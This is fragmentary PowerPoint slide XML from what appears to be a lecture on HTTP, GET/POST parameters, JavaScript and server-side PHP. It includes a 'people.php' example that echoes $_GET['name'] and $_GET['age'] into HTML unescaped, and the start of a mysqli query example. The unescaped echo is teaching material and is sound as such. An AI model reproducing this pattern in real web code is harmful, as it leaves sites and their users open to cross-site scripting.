          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Response</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="HTTP_ResponseMessageExampl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644" y="2259822"/>
            <a:ext cx="7830671" cy="2969871"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="172241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Provide Inputs to the HTTP Server in URLs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Get</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Parameters &amp; Values are contained in the URL of the request</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="get-request-method.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1935" y="3170888"/>
            <a:ext cx="6417990" cy="3105479"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1795460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Provide Inputs to the HTTP Server in URLs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Post</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Parameters &amp; Values are contained in the body of the request</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="getParameterNames-Servlet-request.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333" y="3018247"/>
            <a:ext cx="6695632" cy="3599153"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2280446" y="3134014"/>
            <a:ext cx="3987378" cy="2861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0498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Response</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTML</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Executable Scripts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Javascript</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>VBScript</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="695504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a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Hypertext markup language (HTML)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Text formatting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Itemized lists</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Hyperlinks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Scripting code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Embedded images</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4109108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Javascript</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Scripts that can be executed by the browser</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Program, not only data. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Scripts can be embedded in the HTML code. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;script&gt;&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4293773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How Does a Server Generate Responses</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Static Data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>E.g., an pure HTML file (with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Scripts: dynamically generate content</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>PHP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ASP.NET</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Java</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>……</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1377163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PHP</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1190550"/>
            <a:ext cx="8229600" cy="1171675"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A PHP file named as “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>people.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="696426" y="2148714"/>
            <a:ext cx="7990374" cy="4524316"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;html&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	&lt;head&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	&lt;title&gt;Query string &lt;/title&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	&lt;/head&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	&lt;body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	// The value of the variable name is found</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t>	echo "&lt;h1&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0" err="1"/>
              <a:t>Hello</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t> " . $_GET["</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0" err="1"/>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t>"] . "&lt;/h1&gt;";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t>	 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t>	// </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0" err="1"/>
              <a:t>The</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0" err="1"/>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t> of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0" err="1"/>
              <a:t>the</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t> variable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0" err="1"/>
              <a:t>age</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0" err="1"/>
              <a:t>is</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES_tradnl" dirty="0" err="1"/>
              <a:t>found</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES_tradnl" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	echo "&lt;h1&gt;You are " . $_GET["age"] . " years old &lt;/h1&gt;”;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	?&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	&lt;/body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	&lt;/html&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2774609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PHP</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A PHP file named as “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>people.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Visit this webpage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://www.example.com/people.php?name=Joe&amp;age=24</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>What is the response?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30828691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Server-Side Scripting</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1600201"/>
            <a:ext cx="8229600" cy="557220"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Scripting the server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="1231-800x489.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8229" y="2391488"/>
            <a:ext cx="6199553" cy="3789477"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="image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7136" y="4515606"/>
            <a:ext cx="1188758" cy="823325"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3951084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Server-Side Scripting</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1600201"/>
            <a:ext cx="8229600" cy="557220"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Scripting the server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="7" name="Group 6"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="109242" y="2391488"/>
            <a:ext cx="6199553" cy="3789477"/>
            <a:chOff x="1338229" y="2391488"/>
            <a:chExt cx="6199553" cy="3789477"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="4" name="Picture 3" descr="1231-800x489.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8229" y="2391488"/>
              <a:ext cx="6199553" cy="3789477"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="Picture 4" descr="image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7136" y="4515606"/>
              <a:ext cx="1188758" cy="823325"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
      </p:grpSp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5" descr="9MYg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6187" y="4010209"/>
            <a:ext cx="1536954" cy="1536954"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="9" name="Straight Arrow Connector 8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6308800" y="4683512"/>
            <a:ext cx="778358"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1785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3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="25000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;!DOCTYPE html&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;html&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>servername</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>localhost</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$username = "username";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$password = "password";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dbname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>myDB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>// Create connection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$conn = new </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mysqli</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>servername</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, $username, $password, $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dbname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>// Check connection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>if ($conn-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>connect_error</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>     die("Connection failed: " . $conn-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>connect_error</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>} </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = "SELECT id, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>firstname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lastname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>MyGuests</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$result = $conn-&gt;query($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>if ($result-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>num_rows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> &gt; 0) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>     // output data of each row</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
